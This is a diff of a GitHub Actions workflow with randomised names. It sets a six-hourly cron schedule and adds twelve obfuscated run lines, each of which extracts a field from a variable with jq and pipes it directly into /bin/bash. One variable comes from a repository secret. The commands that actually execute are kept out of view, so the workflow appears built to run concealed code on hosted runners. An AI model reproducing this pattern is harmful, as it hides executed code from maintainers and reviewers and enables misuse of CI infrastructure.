@@ -1,9 +1,9 @@
 name: wupianyu6712
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '59 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wupianyu6712
         env:
-          sv68: ${{ secrets.sv68 }}
+          du917: ${{ secrets.du917 }}
         run: |
-          echo $sv68 | jq -r .tbh84 | /bin/bash
-          echo $ahac1 | jq -r .xb5 | /bin/bash
-          echo $lmqgd487 | jq -r .qkdkm6 | /bin/bash
-          echo $tswj00 | jq -r .ijdp61584 | /bin/bash
-          echo $kfpe64 | jq -r .l654 | /bin/bash
-          echo $bq3 | jq -r .dpnlp35 | /bin/bash
+          echo $du917 | jq -r .ub581 | /bin/bash
+          echo $jor450 | jq -r .sqa2 | /bin/bash
+          echo $mxoq36481 | jq -r .lxo1796 | /bin/bash
+          echo $l1 | jq -r .p94189 | /bin/bash
+          echo $or295 | jq -r .qcwdj056 | /bin/bash
+          echo $cqiy516 | jq -r .cqmus964 | /bin/bash
+          echo $ywv906 | jq -r .htnqz91 | /bin/bash
+          echo $ln93 | jq -r .tzu82 | /bin/bash
+          echo $l3 | jq -r .bgb03 | /bin/bash
+          echo $wohoa1781 | jq -r .ts7 | /bin/bash
+          echo $cvx945 | jq -r .l211 | /bin/bash
+          echo $i9 | jq -r .rj935 | /bin/bash
 
